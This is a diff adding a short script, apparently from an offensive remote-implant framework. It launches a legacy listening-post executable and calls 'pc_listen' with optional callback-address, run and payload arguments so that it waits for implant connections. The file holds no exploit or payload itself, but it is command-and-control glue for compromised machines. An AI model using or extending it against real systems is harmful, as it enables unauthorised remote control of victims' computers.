@@ -1,0 +1,51 @@
+
+@include "_CommandLine.dsi";
+@include "_LpHelperFunctions.dsi";
+@include "_Paths.dsi";
+@include "_VersionChecks.dsi";
+@echo off;
+
+string %params;
+if (!_ParseCommandLine($argc, $argv, %params))
+{
+	return false;
+}
+
+string $logDir;
+_GetLpLogsDirectory($logDir);
+StrCat($logDir, "/LegacyPc/");
+_NormalizePath($logDir, _IsWindowsLocal());
+FileMkdir($logDir);
+
+string $rootDir;
+_GetLpResourcesDirectory($rootDir);
+StrCat($rootDir, "..");
+_NormalizePath($rootDir, _IsWindowsLocal());
+string $pcDir = "%_sgEnv{'script_path'}/../Legacy/Bin";
+_NormalizePath($pcDir, _IsWindowsLocal());
+	
+string $cmdLine = 'cmd /c start $pcDir\\PC_LP.exe \\"$logDir\\" 1';
+
+if (!`local run -command "$cmdLine" -wait -directory "$pcDir"`)
+{
+	echo("* Failed to run legacy PC LP", ERROR);
+	pause;
+	return true;
+}	
+
+string $pcListenArgs= "";
+if (defined(%params{'cpaddr'}))
+{
+	StrCat($pcListenArgs, " -cpaddr %params{'cpaddr'}");
+}
+if (defined(%params{'run'}))
+{
+	StrCat($pcListenArgs, " -run %params{'run'}");
+}
+if (defined(%params{'payload'}))
+{
+	StrCat($pcListenArgs, " -payload %params{'payload'}");
+}
+@echo on;
+echo "Listening for passed socket";
+return `pc_listen -reuse -nolisten -key Default$pcListenArgs`;
